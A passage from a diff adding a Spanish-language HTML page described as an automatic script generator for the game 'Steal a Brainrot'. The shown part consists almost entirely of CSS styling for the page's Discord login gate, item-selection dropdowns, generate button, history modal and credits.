@@ -1,0 +1,2013 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>𝔥𝔬𝔫𝔢𝔶</title>
+<meta name="description" content="Generador automático de scripts para Steal a Brainrot">
+<link rel="icon" type="image/png" href="https://media.giphy.com/media/yHXNK60fSqMLccKpxb/giphy.gif">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--red:#ffffff;--red2:#d4d4d8;--red3:#ffffff;--red-glow:rgba(255,255,255,0.22);--red-soft:rgba(255,255,255,0.07);--red-border:rgba(255,255,255,0.22);--bg:#050508;--surface:rgba(255,255,255,0.03);--surface2:rgba(255,255,255,0.05);--surface3:rgba(10,2,2,0.95);--glass:rgba(255,255,255,0.04);--white:#ffffff;--white2:rgba(255,255,255,0.85);--white3:rgba(255,255,255,0.5);--white4:rgba(255,255,255,0.15)}
+body{background:var(--bg);color:var(--white);font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}
+
+/* ── FONDO ANIMADO ── */
+.bg{position:fixed;inset:0;z-index:0;overflow:hidden}
+.bg::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(255,255,255,0.08) 0%,transparent 70%),radial-gradient(ellipse 50% 40% at 80% 80%,rgba(255,255,255,0.035) 0%,transparent 60%),#050508}
+.bg-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,0.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.035) 1px,transparent 1px);background-size:40px 40px;animation:gridMove 20s linear infinite}
+@keyframes gridMove{0%{transform:translateY(0)}100%{transform:translateY(40px)}}
+.orb{position:absolute;border-radius:50%;filter:blur(80px);animation:orbFloat 8s ease-in-out infinite}
+.orb1{width:400px;height:400px;background:radial-gradient(circle,rgba(255,255,255,0.07),transparent 70%);top:-100px;left:-100px;animation-delay:0s}
+.orb2{width:300px;height:300px;background:radial-gradient(circle,rgba(255,255,255,0.035),transparent 70%);bottom:-50px;right:-50px;animation-delay:-4s}
+@keyframes orbFloat{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,20px) scale(1.1)}}
+
+/* ── PARTICLES ── */
+.particles{position:absolute;inset:0;pointer-events:none}
+.p{position:absolute;width:2px;height:2px;background:var(--red3);border-radius:50%;animation:pFloat linear infinite;opacity:0}
+@keyframes pFloat{0%{opacity:0;transform:translateY(100vh) scale(0)}10%{opacity:.6}90%{opacity:.3}100%{opacity:0;transform:translateY(-20px) scale(1.5)}}
+
+/* ── LAYOUT ── */
+.wrap{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;padding:2rem 1rem;padding-top:5rem}
+
+/* ── CARD ── */
+.card{background:linear-gradient(145deg,rgba(15,5,8,0.95),rgba(8,2,4,0.98));border-radius:28px;padding:2rem;max-width:680px;width:100%;border:1px solid var(--red-border);box-shadow:0 0 0 1px rgba(255,255,255,0.03),0 20px 60px rgba(0,0,0,0.8),0 0 40px rgba(255,255,255,0.08);position:relative;margin-bottom:2rem;backdrop-filter:blur(20px)}
+.card::before{content:'';position:absolute;inset:0;border-radius:28px;background:linear-gradient(135deg,rgba(255,255,255,0.03) 0%,transparent 50%);pointer-events:none}
+.card-line{position:absolute;top:0;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.28),transparent)}
+
+/* ── TOP BAR ── */
+.top-bar{position:fixed;top:0;left:0;right:0;z-index:300;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;background:rgba(5,5,8,0.8);backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,0.07)}
+.top-bar-left{display:flex;align-items:center;gap:10px}
+.top-bar-logo{font-size:18px;font-weight:900;background:linear-gradient(135deg,#fff,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px}
+.top-bar-right{display:flex;align-items:center;gap:10px}
+
+/* ── LANG ── */
+.lang-wrap{position:relative}
+.lang-btn{width:34px;height:34px;border-radius:50%;border:1px solid var(--red-border);background:var(--surface);cursor:pointer;display:flex;align-items:center;justify-content:center;overflow:hidden;padding:0;transition:.2s}
+.lang-btn:hover{border-color:var(--red);box-shadow:0 0 10px var(--red-glow)}
+.lang-btn img{width:100%;height:100%;object-fit:cover}
+.lang-menu{display:none;position:absolute;top:42px;right:0;min-width:190px;background:rgba(10,2,4,0.98);border:1px solid var(--red-border);border-radius:16px;padding:6px;box-shadow:0 20px 40px rgba(0,0,0,0.9),0 0 20px rgba(255,255,255,0.06);z-index:400;backdrop-filter:blur(20px)}
+.lang-menu.open{display:block}
+.lang-item{display:flex;align-items:center;gap:10px;padding:9px 11px;border-radius:10px;cursor:pointer;transition:.15s}
+.lang-item:hover,.lang-item.active{background:var(--red-soft)}
+.lang-item img{width:24px;height:24px;border-radius:50%;object-fit:cover}
+.lang-name{font-size:13px;color:var(--white2);font-weight:600}
+.lang-sub{font-size:10px;color:var(--white3)}
+.check{color:var(--red3);font-size:13px;width:16px;text-align:center;margin-left:auto}
+
+/* ── USER PILL ── */
+.user-pill{display:none;align-items:center;gap:9px;background:var(--red-soft);border:1px solid var(--red-border);border-radius:999px;padding:5px 12px 5px 5px;cursor:pointer;user-select:none;transition:.2s}
+.user-pill:hover{background:rgba(255,255,255,0.18);box-shadow:0 0 15px var(--red-glow)}
+.user-pill.show{display:inline-flex}
+.user-pill img{width:28px;height:28px;border-radius:50%;object-fit:cover;border:1.5px solid var(--red)}
+.user-pill span{font-size:13px;font-weight:700;color:var(--white);max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.logout-btn{background:rgba(255,255,255,0.10);border:1px solid var(--red-border);color:var(--red3);font-size:10px;font-weight:700;padding:3px 8px;border-radius:999px;cursor:pointer;transition:.2s}
+.logout-btn:hover{background:var(--red);color:#fff}
+
+/* ── USER MENU ── */
+.user-menu{display:none;position:fixed;top:62px;right:20px;z-index:310;min-width:220px;background:rgba(10,2,4,0.98);border:1px solid var(--red-border);border-radius:16px;padding:6px;box-shadow:0 20px 40px rgba(0,0,0,0.9),0 0 20px rgba(255,255,255,0.06);backdrop-filter:blur(20px)}
+.user-menu.open{display:block}
+.user-menu-item{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:10px 12px;border-radius:10px;cursor:pointer;font-size:12px;font-weight:700;color:var(--white2);transition:.15s}
+.user-menu-item:hover{background:var(--red-soft)}
+.autosave-badge{font-size:9px;padding:2px 7px;border-radius:999px;font-weight:700;background:rgba(74,222,128,0.12);border:1px solid rgba(74,222,128,0.3);color:#4ade80}
+.autosave-badge.off{background:rgba(248,113,113,0.12);border:1px solid rgba(248,113,113,0.3);color:#f87171}
+
+/* ── AUTH GATE ── */
+.auth-gate{position:fixed;inset:0;background:rgba(2,0,3,0.92);backdrop-filter:blur(20px);z-index:9999;display:flex;align-items:center;justify-content:center;padding:1.5rem}
+.auth-gate.hidden{display:none}
+.auth-box{background:linear-gradient(145deg,rgba(18,5,8,0.99),rgba(8,2,4,0.99));border:1px solid var(--red-border);border-radius:28px;padding:2.5rem 2rem;max-width:400px;width:100%;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.95),0 0 60px rgba(255,255,255,0.12),inset 0 1px 0 rgba(255,255,255,0.05);position:relative;overflow:hidden}
+.auth-box::before{content:'';position:absolute;top:0;left:15%;right:15%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.32),transparent)}
+.auth-shine{position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg at 50% 50%,transparent 0deg,rgba(255,255,255,0.03) 60deg,transparent 120deg);animation:authShine 8s linear infinite;pointer-events:none}
+@keyframes authShine{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+.auth-custom-img{width:100%;height:210px;object-fit:cover;object-position:center 48%;border-radius:18px;border:1px solid rgba(255,255,255,.35);margin-bottom:18px;display:none;filter:grayscale(1) contrast(1.12);box-shadow:0 12px 35px rgba(0,0,0,.7),0 0 28px rgba(255,255,255,.12)}
+.auth-custom-img.show{display:block}
+.auth-logo{width:72px;height:72px;border-radius:22px;background:linear-gradient(135deg,rgba(255,255,255,0.08),rgba(255,255,255,0.3));border:1px solid var(--red-border);display:inline-flex;align-items:center;justify-content:center;margin-bottom:16px;font-size:32px;box-shadow:0 0 30px rgba(255,255,255,0.16),inset 0 1px 0 rgba(255,255,255,0.1);position:relative;z-index:1}
+.auth-box h2{font-size:1.6rem;font-weight:900;background:linear-gradient(135deg,#fff 0%,#d4d4d8 50%,#ffffff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px;letter-spacing:-0.5px;position:relative;z-index:1}
+.auth-box p{font-size:13px;color:var(--white3);line-height:1.5;margin-bottom:1.6rem;position:relative;z-index:1}
+.discord-login-btn{width:100%;padding:15px 18px;background:#050505;border:1px solid rgba(255,255,255,.72);border-radius:14px;color:#fff;font-size:14px;font-weight:800;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:10px;transition:all .25s;letter-spacing:.3px;position:relative;z-index:1;box-shadow:0 5px 22px rgba(0,0,0,.8),inset 0 0 0 1px rgba(255,255,255,.08);overflow:hidden}
+.discord-login-btn:hover{transform:translateY(-3px);background:#111;border-color:#fff;box-shadow:0 10px 32px rgba(255,255,255,.18),0 0 0 3px rgba(255,255,255,.06)}
+.discord-login-btn:active{transform:translateY(0)}
+.discord-login-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+.auth-status{font-size:11px;color:#f87171;margin-top:12px;min-height:16px;position:relative;z-index:1}
+
+/* ── HEADER ── */
+.header{text-align:center;margin-bottom:2rem}
+.logo-container{display:inline-flex;align-items:center;justify-content:center;width:76px;height:76px;background:linear-gradient(135deg,rgba(255,255,255,0.08),rgba(255,255,255,0.3));border:1px solid var(--red-border);border-radius:24px;margin-bottom:16px;box-shadow:0 0 40px rgba(255,255,255,0.12),inset 0 1px 0 rgba(255,255,255,0.08);position:relative}
+.logo-container::after{content:'';position:absolute;inset:-1px;border-radius:24px;background:linear-gradient(135deg,rgba(255,255,255,0.16),transparent 50%);pointer-events:none}
+.logo-icon{font-size:34px;position:relative;z-index:1}
+.header h1{font-size:2.6rem;font-weight:900;background:linear-gradient(135deg,#ffffff 0%,#e5e5e5 40%,#ffffff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-1px;line-height:1}
+.header p{color:var(--white3);font-size:13px;margin-top:6px;font-weight:500}
+.discord-link{display:inline-flex;align-items:center;gap:8px;background:var(--red-soft);border:1px solid var(--red-border);color:var(--red3);padding:8px 18px;border-radius:999px;text-decoration:none;font-size:12px;font-weight:700;margin-top:12px;transition:.2s}
+.discord-link:hover{background:rgba(255,255,255,0.10);box-shadow:0 0 15px var(--red-glow)}
+.badges{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:1.2rem 0 1.8rem}
+.badge{background:var(--red-soft);border:1px solid var(--red-border);color:var(--red3);padding:5px 14px;border-radius:999px;font-size:11px;font-weight:600;letter-spacing:0.3px}
+
+/* ── SECTION LABEL ── */
+.lbl{font-size:9px;text-transform:uppercase;color:var(--white3);margin-bottom:7px;display:block;letter-spacing:2px;font-weight:700}
+.field{margin-bottom:1.2rem}
+
+/* ── INPUTS ── */
+.inp{width:100%;padding:13px 15px;background:var(--surface);border:1px solid rgba(255,255,255,0.08);border-radius:14px;color:var(--white);outline:none;font-size:13px;font-family:'Inter',sans-serif;transition:.2s;font-weight:500}
+.inp:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(255,255,255,0.12)}
+.inp::placeholder{color:var(--white3)}
+.lookup-status{font-size:11px;color:var(--white3);margin-top:6px;min-height:16px;font-weight:500}
+.lookup-status.loading{color:#facc15}
+.lookup-status.ok{color:#4ade80}
+.lookup-status.err{color:#f87171}
+
+/* ── MODE TABS ── */
+.mode-tabs{display:flex;background:var(--surface);border:1px solid rgba(255,255,255,0.06);border-radius:14px;margin-bottom:12px;position:relative;padding:4px;gap:2px}
+.mode-btn{flex:1;padding:10px 6px;background:transparent;border:none;border-radius:10px;color:var(--white3);cursor:pointer;font-size:11px;z-index:2;position:relative;text-align:center;font-weight:700;font-family:'Inter',sans-serif;transition:.2s;letter-spacing:0.3px}
+.mode-btn.active{color:#fff}
+.mode-btn:hover:not(.active){color:var(--white2)}
+.mode-slider{position:absolute;top:4px;bottom:4px;left:4px;width:calc(25% - 4px);background:linear-gradient(135deg,var(--red),var(--red2));border-radius:10px;transition:transform .3s cubic-bezier(.4,0,.2,1);z-index:1;box-shadow:0 2px 10px rgba(255,255,255,0.20)}
+.custom-area{display:none;margin-top:8px}
+
+/* ── DROPDOWN ── */
+.br-select-btn{width:100%;padding:13px 15px;background:var(--surface);border:1px solid rgba(255,255,255,0.08);border-radius:14px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;color:var(--white3);font-size:13px;font-family:'Inter',sans-serif;font-weight:500;transition:.2s}
+.br-select-btn:hover{border-color:var(--red-border);background:var(--surface2)}
+.br-select-btn .arrow{font-size:10px;opacity:0.5;transition:.2s}
+.position-relative{position:relative}
+.dd{position:absolute;top:calc(100% + 6px);left:0;right:0;background:rgba(8,2,5,0.99);border:1px solid var(--red-border);border-radius:16px;max-height:400px;overflow-y:auto;display:none;z-index:200;box-shadow:0 20px 50px rgba(0,0,0,0.9),0 0 20px rgba(255,255,255,0.06);backdrop-filter:blur(20px)}
+.dd.open{display:block;animation:ddOpen .15s ease}
+@keyframes ddOpen{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+.cat-tabs{display:flex;gap:6px;padding:10px;border-bottom:1px solid rgba(255,255,255,0.05);flex-wrap:wrap}
+.cat-btn{padding:5px 12px;background:var(--surface);border:1px solid rgba(255,255,255,0.07);border-radius:999px;cursor:pointer;font-size:11px;color:var(--white3);font-family:'Inter',sans-serif;font-weight:600;transition:.2s}
+.cat-btn.active{background:var(--red);border-color:var(--red);color:#fff;box-shadow:0 2px 10px rgba(255,255,255,0.20)}
+.dd-search{padding:10px}
+.dd-search input{width:100%;padding:9px 12px;background:var(--surface);border:1px solid rgba(255,255,255,0.07);border-radius:10px;color:#fff;outline:none;font-size:12px;font-family:'Inter',sans-serif}
+.dd-search input:focus{border-color:var(--red-border)}
+.mps-filter-row{padding:6px 10px 10px;display:flex;gap:6px}
+.mps-filter-row input{flex:1;padding:7px 10px;background:var(--surface);border:1px solid rgba(255,255,255,0.07);border-radius:8px;color:#fff;outline:none;font-size:11px;font-family:'Inter',sans-serif}
+.mps-filter-row button{padding:7px 12px;background:var(--red-soft);border:1px solid var(--red-border);border-radius:8px;color:var(--red3);font-size:11px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s}
+.mps-filter-row button:hover{background:var(--red);color:#fff}
+.br-list{max-height:240px;overflow-y:auto}
+.br-item{padding:9px 12px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:.15s}
+.br-item:hover{background:var(--red-soft)}
+.br-item.sel{background:rgba(255,255,255,0.08)}
+.br-chk{width:18px;height:18px;border:1.5px solid rgba(255,255,255,0.2);border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:10px;flex-shrink:0;transition:.15s}
+.br-item.sel .br-chk{background:var(--red);border-color:var(--red);color:#fff;box-shadow:0 0 8px rgba(255,255,255,0.24)}
+.item-thumb{width:26px;height:26px;border-radius:7px;object-fit:cover;background:var(--surface);border:1px solid rgba(255,255,255,0.07);flex-shrink:0}
+.item-thumb-placeholder{width:26px;height:26px;border-radius:7px;background:var(--surface);border:1px dashed rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--white3);flex-shrink:0}
+.br-name{flex:1;font-size:12px;font-weight:500;color:var(--white2)}
+.br-mps{font-size:11px;color:#4ade80;font-weight:700;margin-right:4px;white-space:nowrap}
+.br-rarity{font-size:9px;font-weight:700}
+.rarity-OG{color:#ff9d00}
+.rarity-Secret{color:#ff4081}
+.dd-footer{padding:10px;border-top:1px solid rgba(255,255,255,0.05);display:flex;gap:6px}
+.dd-footer button{flex:1;padding:8px;background:var(--surface);border:1px solid rgba(255,255,255,0.07);border-radius:9px;color:var(--white2);cursor:pointer;font-size:11px;font-family:'Inter',sans-serif;font-weight:600;transition:.2s}
+.dd-footer button:hover{background:var(--red-soft);border-color:var(--red-border);color:var(--red3)}
+.tags{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px;max-height:80px;overflow-y:auto}
+.tag{background:var(--red-soft);border:1px solid var(--red-border);padding:4px 10px;border-radius:999px;font-size:11px;display:inline-flex;align-items:center;gap:5px;color:var(--red3);font-weight:600}
+.tag img{width:14px;height:14px;border-radius:4px;object-fit:cover}
+.tag button{background:none;border:none;color:rgba(255,255,255,0.35);cursor:pointer;line-height:1;font-size:13px;padding:0 0 0 2px}
+.tag button:hover{color:var(--red3)}
+.empty-list{padding:16px;text-align:center;color:var(--white3);font-size:12px}
+
+/* ── ACTIVE OPTIONS INFO ── */
+.active-options{margin-top:1.2rem;border-top:1px solid rgba(255,255,255,0.05);padding-top:1.2rem;display:flex;gap:8px;flex-wrap:wrap}
+.opt-chip{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;background:var(--red-soft);border:1px solid var(--red-border);border-radius:999px;font-size:11px;font-weight:700;color:var(--red3)}
+.opt-chip .dot{width:6px;height:6px;border-radius:50%;background:var(--red3);box-shadow:0 0 6px var(--red3);animation:pulse 1.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
+
+/* ── GENERATE BUTTON ── */
+.gen-btn{width:100%;padding:16px;border-radius:16px;border:none;font-size:15px;font-weight:800;cursor:pointer;margin-top:1.2rem;background:linear-gradient(135deg,var(--red),var(--red2));color:#fff;transition:all .2s;font-family:'Inter',sans-serif;letter-spacing:0.3px;position:relative;overflow:hidden;box-shadow:0 4px 20px rgba(255,255,255,0.18)}
+.gen-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.1),transparent);pointer-events:none}
+.gen-btn::after{content:'';position:absolute;top:-50%;left:-60%;width:40%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.1),transparent);transform:skewX(-20deg);transition:.5s}
+.gen-btn:hover:not(.disabled)::after{left:120%}
+.gen-btn:hover:not(.disabled){transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,255,255,0.26)}
+.gen-btn:active:not(.disabled){transform:translateY(0)}
+.gen-btn.disabled{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:rgba(255,255,255,0.3);cursor:not-allowed;box-shadow:none}
+
+/* ── RESULT ── */
+.result{margin-top:1.5rem;display:none}
+.result.show{display:block;animation:resultIn .3s ease}
+@keyframes resultIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.result-header{display:flex;justify-content:space-between;margin-bottom:10px;font-size:13px;align-items:center;font-weight:700;color:var(--white2)}
+.copy-btn{padding:8px 16px;background:var(--red-soft);border:1px solid var(--red-border);border-radius:999px;color:var(--red3);cursor:pointer;font-size:12px;font-family:'Inter',sans-serif;font-weight:700;transition:.2s}
+.copy-btn:hover{background:var(--red);color:#fff;box-shadow:0 0 15px var(--red-glow)}
+.script-box{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:1.2rem;font-family:'Courier New',monospace;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;color:var(--red3);line-height:1.6}
+
+/* ── TOAST ── */
+.toast{position:fixed;bottom:24px;right:24px;background:linear-gradient(135deg,rgba(15,5,8,0.98),rgba(8,2,4,0.99));border:1px solid var(--red-border);color:#fff;padding:12px 20px;border-radius:14px;z-index:10000;max-width:300px;font-size:13px;font-weight:600;animation:toastIn .3s cubic-bezier(.4,0,.2,1);box-shadow:0 10px 30px rgba(0,0,0,0.8),0 0 20px rgba(255,255,255,0.06);font-family:'Inter',sans-serif}
+@keyframes toastIn{from{opacity:0;transform:translateY(20px) scale(.9)}to{opacity:1;transform:translateY(0) scale(1)}}
+
+/* ── HISTORY MODAL ── */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(12px);z-index:5000;align-items:center;justify-content:center;padding:1rem}
+.modal-overlay.open{display:flex}
+.modal-box{background:linear-gradient(145deg,rgba(15,5,8,0.99),rgba(8,2,4,0.99));border:1px solid var(--red-border);border-radius:24px;padding:1.8rem;max-width:600px;width:100%;max-height:80vh;overflow-y:auto;box-shadow:0 30px 80px rgba(0,0,0,0.95)}
+.modal-box h3{font-size:16px;font-weight:800;margin-bottom:1rem;color:var(--white)}
+.history-item{background:var(--surface);border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:12px;margin-bottom:8px}
+.history-item-top{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap}
+.history-date{font-size:11px;color:var(--white3)}
+.history-actions{display:flex;gap:5px}
+.history-actions button{padding:4px 10px;background:var(--surface2);border:1px solid rgba(255,255,255,0.07);border-radius:7px;color:var(--white2);cursor:pointer;font-size:11px;font-family:'Inter',sans-serif;font-weight:600;transition:.15s}
+.history-actions button:hover{background:var(--red-soft);border-color:var(--red-border);color:var(--red3)}
+.history-meta{font-size:11px;color:var(--white3);margin-top:4px;word-break:break-all;opacity:.8}
+.history-empty{text-align:center;color:var(--white3);padding:2rem;font-size:13px}
+.modal-close{background:none;border:none;color:var(--white3);cursor:pointer;font-size:20px;float:right;margin-top:-4px;transition:.2s}
+.modal-close:hover{color:var(--red3)}
+
+/* ── CREDITS ── */
+.credits-card{background:linear-gradient(145deg,rgba(15,5,8,0.95),rgba(8,2,4,0.98));border-radius:28px;padding:1.8rem;max-width:680px;width:100%;border:1px solid var(--red-border);box-shadow:0 20px 60px rgba(0,0,0,0.8),0 0 40px rgba(255,255,255,0.06);display:flex;flex-direction:column;gap:10px;position:relative;overflow:hidden}
+.credits-card::before{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.24),transparent)}
+.credits-title{font-size:10px;text-transform:uppercase;color:var(--red3);letter-spacing:3px;margin-bottom:6px;font-weight:800;text-align:center}
+.credit-item{background:var(--surface);border:1px solid rgba(255,255,255,0.05);border-radius:16px;padding:12px 14px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;transition:.2s}
+.credit-item:hover{background:var(--surface2);border-color:var(--red-border)}
+.credit-left{display:flex;align-items:center;gap:12px}
+.credit-avatar{width:40px;height:40px;border-radius:50%;object-fit:cover;border:1.5px solid var(--red-border);flex-shrink:0}
+.credit-info{display:flex;flex-direction:column}
+.credit-name-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.credit-name{font-size:13px;font-weight:800;color:var(--white)}
+.credit-role{font-size:11px;color:var(--white3);margin-top:1px}
+.credit-badge{font-size:9px;padding:2px 7px;border-radius:999px;font-weight:800;text-transform:uppercase;letter-spacing:0.5px}
+.cb-owner{background:rgba(234,179,8,0.15);border:1px solid rgba(234,179,8,0.3);color:#facc15}
+.cb-dev{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.16);color:#f87171}
+.cb-subowner{background:rgba(139,92,246,0.15);border:1px solid rgba(139,92,246,0.3);color:#a78bfa}
+.credit-right{display:flex;flex-direction:column;align-items:flex-end;gap:6px;flex-shrink:0}
+.credit-discord{font-size:11px;color:var(--red3);background:var(--red-soft);border:1px solid var(--red-border);padding:4px 10px;border-radius:8px;text-decoration:none;font-weight:700;transition:.2s}
+.credit-discord:hover{background:var(--red);color:#fff}
+.credit-join{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,var(--red),var(--red2));color:#fff;padding:6px 14px;border-radius:999px;text-decoration:none;font-size:11px;font-weight:800;white-space:nowrap;transition:.2s;box-shadow:0 2px 10px rgba(255,255,255,0.14)}
+.credit-join:hover{box-shadow:0 4px 20px rgba(255,255,255,0.22);transform:translateY(-1px)}
+
+/* ── JOIN BANNER ── */
+#joinServerBanner{margin-top:16px;padding:16px;background:var(--red-soft);border:1px solid var(--red-border);border-radius:16px;text-align:center}
+#joinServerBanner p:first-child{font-size:13px;color:#fca5a5;margin-bottom:12px;font-weight:700}
+#joinServerBtn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,var(--red),var(--red2));color:#fff;padding:11px 22px;border-radius:12px;text-decoration:none;font-size:13px;font-weight:800;transition:.2s;box-shadow:0 4px 15px rgba(255,255,255,0.18)}
+#joinServerBtn:hover{box-shadow:0 6px 25px rgba(255,255,255,0.26);transform:translateY(-1px)}
+#joinServerBanner p:last-child{font-size:11px;color:var(--white3);margin-top:10px}
+
+@media(max-width:500px){.wrap{padding:1rem .5rem;padding-top:5rem}.header h1{font-size:1.8rem}.card{padding:1.2rem;border-radius:20px}.mode-btn{font-size:10px;padding:8px 4px}.top-bar{padding:10px 14px}}
+
+/* ── EFECTOS EXTRA MONOCROMOS ── */
+.bg::after{content:"";position:absolute;inset:-30%;pointer-events:none;background:conic-gradient(from 0deg,transparent 0 72%,rgba(255,255,255,.045) 78%,transparent 84%);animation:bgOrbit 34s linear infinite;mix-blend-mode:screen}
+@keyframes bgOrbit{to{transform:rotate(360deg)}}
+.bg-grid{mask-image:radial-gradient(ellipse at center,#000 15%,transparent 78%)}
+.orb1{animation:orbFloat 11s ease-in-out infinite,orbPulse 6s ease-in-out infinite}
+.orb2{animation:orbFloat 13s ease-in-out infinite reverse,orbPulse 8s ease-in-out infinite}
+@keyframes orbPulse{0%,100%{opacity:.45}50%{opacity:1}}
+.card,.credits-card,.auth-box{animation:softAppear .7s cubic-bezier(.2,.8,.2,1) both}
+@keyframes softAppear{from{opacity:0;transform:translateY(14px) scale(.985);filter:blur(5px)}to{opacity:1;transform:translateY(0) scale(1);filter:blur(0)}}
+.auth-box{border-color:rgba(255,255,255,.3);box-shadow:0 30px 90px rgba(0,0,0,.95),0 0 35px rgba(255,255,255,.09),inset 0 1px 0 rgba(255,255,255,.09)}
+.auth-box::after{content:"";position:absolute;inset:8px;border:1px solid rgba(255,255,255,.055);border-radius:22px;pointer-events:none}
+.auth-custom-img.show{animation:photoReveal .8s ease both}
+@keyframes photoReveal{from{opacity:0;transform:scale(.97);filter:grayscale(1) blur(8px)}to{opacity:1;transform:scale(1);filter:grayscale(1) contrast(1.12) blur(0)}}
+.discord-login-btn::before{content:"";position:absolute;inset:0;left:-120%;width:70%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.16),transparent);transform:skewX(-18deg);animation:buttonSweep 4s ease-in-out infinite}
+@keyframes buttonSweep{0%,55%{left:-120%}85%,100%{left:150%}}
+.discord-login-btn svg,.discord-login-btn{isolation:isolate}
+::selection{background:#fff;color:#000}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;scroll-behavior:auto!important}}
+
+
+/* HONEN LOGIN — diseño integrado desde discord_login.html */
+#discordAuthGate{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;overflow-y:auto;padding:24px;background:radial-gradient(ellipse at 50% 0%,#25252d 0%,#111115 35%,#09090b 75%);backdrop-filter:blur(18px)}
+#discordAuthGate.hidden{display:none}
+#discordAuthGate .auth-box{position:relative;width:min(100%,460px);max-width:460px;margin:auto;padding:34px;border:1px solid #303038;border-radius:25px;background:linear-gradient(145deg,rgba(27,27,32,.98),rgba(13,13,16,.99));box-shadow:0 28px 90px #000c,0 0 45px rgba(255,255,255,.055);text-align:left;overflow:hidden;animation:honenCardIn .65s cubic-bezier(.2,.8,.2,1) both}
+#discordAuthGate .auth-box:before{content:"";position:absolute;inset:0 15% auto;height:1px;background:linear-gradient(90deg,transparent,#fff9,transparent)}
+#discordAuthGate .auth-box:after{content:"";position:absolute;inset:9px;border:1px solid rgba(255,255,255,.045);border-radius:18px;pointer-events:none}
+@keyframes honenCardIn{from{opacity:0;transform:translateY(18px) scale(.98);filter:blur(5px)}to{opacity:1;transform:none;filter:none}}
+.honen-brand{display:flex;align-items:center;gap:13px;margin-bottom:34px;position:relative;z-index:1}
+.honen-mark{width:54px;height:54px;display:grid;place-items:center;overflow:hidden;border:1px solid #44444d;border-radius:16px;background:#202026;box-shadow:0 5px 22px #0009}
+.honen-mark img{width:100%;height:100%;display:block;object-fit:cover}
+.honen-mark span{font-size:24px;font-weight:900;color:#fff}
+.honen-brand-name{font-size:15px;font-weight:900;letter-spacing:.18em;color:#fff}
+.honen-eyebrow{font-size:11px;letter-spacing:.24em;color:#a6a6af;text-transform:uppercase;margin:0 0 13px;position:relative;z-index:1}
+#discordAuthGate .honen-welcome{font-size:34px;line-height:1.1;letter-spacing:-.045em;margin:0 0 14px;color:#fff;position:relative;z-index:1}
+#discordAuthGate .honen-desc{color:#a1a1aa;font-size:15px;line-height:1.7;margin:0 0 30px;position:relative;z-index:1}
+#discordAuthGate .discord-login-btn{width:100%;min-height:64px;display:flex;align-items:center;justify-content:center;gap:12px;padding:16px 18px;border:1px solid #777;border-radius:16px;background:#050505;color:#fff;font-size:15px;font-weight:850;text-decoration:none;transition:transform .2s,box-shadow .2s,border-color .2s;position:relative;z-index:1;box-shadow:0 8px 28px #000b,inset 0 0 0 1px #ffffff12;overflow:hidden}
+#discordAuthGate .discord-login-btn:hover{transform:translateY(-2px);background:#111;border-color:#fff;box-shadow:0 12px 32px #ffffff20}
